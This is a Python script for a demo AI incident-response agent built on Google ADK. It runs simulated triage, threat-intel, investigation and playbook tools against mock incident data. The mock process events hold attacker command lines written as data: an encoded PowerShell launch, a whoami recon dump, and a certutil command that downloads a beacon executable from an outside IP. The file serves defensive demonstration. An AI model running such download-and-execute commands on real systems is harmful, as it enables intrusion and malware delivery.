"""
Standalone Cyber Guardian: incident response with Runner API.

Unlike the adk/ version (loaded by `adk web`), this script runs the
orchestrator from the command line. It demonstrates:
  - An agent with multiple tools representing IR workflow stages
  - The Runner API for programmatic control
  - Mock security tools returning realistic incident data

Requires:
  - GOOGLE_API_KEY in the environment (or .env file)

Usage:
  python3 agent.py

Based on google/adk-samples/cyber-guardian-agent (Apache 2.0).
"""

import asyncio
import json
import logging
import os
import uuid

from dotenv import load_dotenv
from google.adk.agents import Agent
from google.adk.runners import Runner
from google.adk.sessions import InMemorySessionService
from google.genai import types

load_dotenv()
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Mock data: realistic security incident (Cobalt Strike C2 via certutil)
# ---------------------------------------------------------------------------

MOCK_ASSETS = {
    "srv-web-prod-01": {
        "Owner": "platform-team",
        "BusinessCriticality": "Critical",
        "OS": "Ubuntu 22.04",
        "AssetType": "Web Server",
    },
    "ws-dev-042": {
        "Owner": "dev-team",
        "BusinessCriticality": "Medium",
        "OS": "Windows 11",
        "AssetType": "Workstation",
    },
}

MOCK_THREAT_INTEL = {
    "185.220.101.42": {
        "IsMalicious": True,
        "ThreatName": "Cobalt Strike C2",
        "Confidence": "High",
        "IOC_Type": "IP",
    },
    "d8e8fca2dc0f896fd7cb4cb0031ba249": {
        "IsMalicious": True,
        "ThreatName": "Mimikatz Credential Dumper",
        "Confidence": "Critical",
        "IOC_Type": "MD5",
    },
}

MOCK_PROCESS_EVENTS = [
    {
        "EventTimestamp": "2026-04-08T14:23:01Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "powershell.exe",
        "ParentProcessName": "w3wp.exe",
        "CommandLine": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:05Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "cmd.exe",
        "ParentProcessName": "powershell.exe",
        "CommandLine": "cmd /c whoami /all > C:\\Windows\\Temp\\recon.txt",
        "Username": "SYSTEM",
    },
    {
        "EventTimestamp": "2026-04-08T14:23:12Z",
        "Hostname": "srv-web-prod-01",
        "ProcessName": "certutil.exe",
        "ParentProcessName": "cmd.exe",
        "CommandLine": "certutil -urlcache -f http://185.220.101.42/beacon.exe C:\\Windows\\Temp\\svc.exe",
        "Username": "SYSTEM",
    },
]

MOCK_NETWORK_CONNECTIONS = [
    {
        "log_timestamp": "2026-04-08T14:23:15Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 443,
        "protocol": "TCP",
    },
    {
        "log_timestamp": "2026-04-08T14:25:30Z",
        "source_host": "srv-web-prod-01",
        "source_ip": "10.0.1.15",
        "destination_ip": "185.220.101.42",
        "destination_port": 8443,
        "protocol": "TCP",
    },
]

MOCK_PLAYBOOKS = {
    "Cobalt Strike C2": [
        {"ActionCommand": "block-ip", "Target": "185.220.101.42 at perimeter firewall", "RequiresApproval": False},
        {"ActionCommand": "isolate-host", "Target": "srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "reset-credentials", "Target": "SYSTEM account on srv-web-prod-01", "RequiresApproval": True},
        {"ActionCommand": "collect-forensics", "Target": "Memory dump from srv-web-prod-01", "RequiresApproval": False},
    ],
}

MOCK_INCIDENTS: list[dict] = []


# ---------------------------------------------------------------------------
# Tool functions
# ---------------------------------------------------------------------------

def triage_alert(hostname: str, alert_type: str) -> str:
    """Step 1: Check for duplicate incidents and enrich a host with business context.

    Call this FIRST. If is_duplicate is true, stop processing.

    Args:
        hostname: The hostname from the alert.
        alert_type: The type of the alert (e.g., 'IOC_MATCH', 'EDR_DETECTION').
    """
    print(f"\n  [Triage] Checking {hostname} for {alert_type}...")
    for incident in MOCK_INCIDENTS:
        if incident["hostname"] == hostname and incident["alert_type"] == alert_type:
            return json.dumps({"is_duplicate": True, "existing_incident": incident["incident_id"]})
    asset = MOCK_ASSETS.get(hostname)
    if asset:
        return json.dumps({"is_duplicate": False, "asset_context": asset})
    return json.dumps({"is_duplicate": False, "asset_context": {"Owner": "Unknown", "BusinessCriticality": "Unknown"}})


def enrich_threat_intel(indicators: list[str]) -> str:
    """Step 2: Enrich IOCs using threat intelligence.

    Args:
        indicators: List of IOC values (IPs, hashes, domains).
    """
    print(f"\n  [Threat Intel] Enriching {len(indicators)} indicator(s)...")
    results = []
    for ioc in indicators:
        intel = MOCK_THREAT_INTEL.get(ioc)
        if intel:
            results.append({"IOC_Value": ioc, **intel})
        else:
            results.append({"IOC_Value": ioc, "IsMalicious": False, "ThreatName": "Unknown", "Confidence": "Unknown"})
    return json.dumps(results)


def investigate_alert(alert_type: str, hostname: str, parent_process: str = "", destination_ip: str = "") -> str:
    """Step 3: Query endpoint and network logs.

    Args:
        alert_type: 'EDR_DETECTION' or 'IOC_MATCH'.
        hostname: The hostname to investigate.
        parent_process: Parent process name for EDR alerts (optional).
        destination_ip: Malicious IP for IOC_MATCH alerts (optional).
    """
    print(f"\n  [Investigation] Analyzing {alert_type} on {hostname}...")
    if alert_type == "EDR_DETECTION":
        events = [e for e in MOCK_PROCESS_EVENTS if e["Hostname"] == hostname]
        if parent_process:
            events = [e for e in events if e["ParentProcessName"] == parent_process]
        return json.dumps(events)
    if alert_type == "IOC_MATCH" and destination_ip:
        return json.dumps([c for c in MOCK_NETWORK_CONNECTIONS if c["source_host"] == hostname and c["destination_ip"] == destination_ip])
    return json.dumps({"error": "Provide parent_process (EDR) or destination_ip (IOC_MATCH)."})


def get_response_playbook(threat_name: str) -> str:
    """Step 4: Get the response playbook for a threat.

    Args:
        threat_name: The identified threat (e.g., 'Cobalt Strike C2').
    """
    print(f"\n  [Response] Playbook for '{threat_name}'...")
    playbook = MOCK_PLAYBOOKS.get(threat_name)
    if not playbook:
        for key, value in MOCK_PLAYBOOKS.items():
            if key.lower() in threat_name.lower():
                playbook = value
                break
    return json.dumps(playbook) if playbook else json.dumps({"error": f"No playbook for: {threat_name}"})


def execute_response_action(action: str, target: str) -> str:
    """Execute a response action (simulated). Only for actions NOT requiring approval.

    Args:
        action: The action (e.g., 'block-ip', 'collect-forensics').
        target: The target of the action.
    """
    print(f"\n  [Response] Executing '{action}' on '{target}' (simulated)")
    return json.dumps({"status": "success", "action": action, "target": target, "note": "simulated"})


def create_incident(alert_type: str, hostname: str, user: str, severity: str) -> str:
    """Create an incident record.

    Args:
        alert_type: The alert type.
        hostname: The primary host.
        user: The primary user.
        severity: 'Critical', 'High', 'Medium', or 'Low'.
    """
    incident_id = f"INC-{str(uuid.uuid4())[:8]}"
    MOCK_INCIDENTS.append({"incident_id": incident_id, "alert_type": alert_type, "hostname": hostname, "user": user, "severity": severity})
    print(f"\n  [Incident] Created {incident_id}")
    return json.dumps({"status": "success", "incident_id": incident_id})


# ---------------------------------------------------------------------------
# Orchestrator agent
# ---------------------------------------------------------------------------

ORCHESTRATOR_INSTRUCTION = """
You are a cybersecurity incident response orchestrator. Parse the alert,
classify it, and use your tools to run the full workflow:

1. triage_alert: check duplicates and asset context (ALWAYS FIRST)
2. enrich_threat_intel: look up IOCs in threat intelligence
3. investigate_alert: query endpoint/network logs
4. get_response_playbook: find the matching playbook
5. execute_response_action: run actions that don't need approval
6. create_incident: log the incident

For IOC-heavy alerts: triage -> threat_intel -> investigate -> playbook -> execute -> create.
For EDR alerts: triage -> investigate -> threat_intel -> playbook -> execute -> create.
If triage finds a duplicate, STOP.
Flag actions requiring human approval.
"""

MODEL = os.getenv("MODEL_ID", "gemini-2.0-flash")

root_agent = Agent(
    model=MODEL,
    name="cyber_guardian_orchestrator",
    description="Cybersecurity incident response orchestrator",
    instruction=ORCHESTRATOR_INSTRUCTION,
    tools=[
        triage_alert,
        enrich_threat_intel,
        investigate_alert,
        get_response_playbook,
        execute_response_action,
        create_incident,
    ],
)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

SAMPLE_ALERT = (
    "ALERT: IOC_MATCH detected on host srv-web-prod-01 by user svc-apache. "
    "Outbound connection to 185.220.101.42:443 flagged by network IDS. "
    "Process: certutil.exe downloading from 185.220.101.42."
)


async def async_main():
    ss = InMemorySessionService()
    session = await ss.create_session(
        app_name="cyber_guardian_app",
        user_id="analyst",
        state={},
    )

    alert_text = os.getenv("ALERT_TEXT", SAMPLE_ALERT)
    print(f"Alert: {alert_text}\n")

    content = types.Content(
        role="user",
        parts=[types.Part(text=alert_text)],
    )

    runner = Runner(
        app_name="cyber_guardian_app",
        agent=root_agent,
        session_service=ss,
    )

    print("Running Cyber Guardian pipeline...\n")
    async for event in runner.run_async(
        session_id=session.id,
        user_id=session.user_id,
        new_message=content,
    ):
        if event.content and event.content.parts:
            for part in event.content.parts:
                if part.text:
                    print(f"[{event.author}] {part.text}\n")
                elif part.function_call:
                    print(f"[{event.author}] calling: {part.function_call.name}({dict(part.function_call.args)})")

    print("\nDone.")


if __name__ == "__main__":
    if not os.getenv("GOOGLE_API_KEY"):
        raise EnvironmentError(
            "Set GOOGLE_API_KEY in your environment or .env file.\n"
            "Get one from https://aistudio.google.com/"
        )
    asyncio.run(async_main())
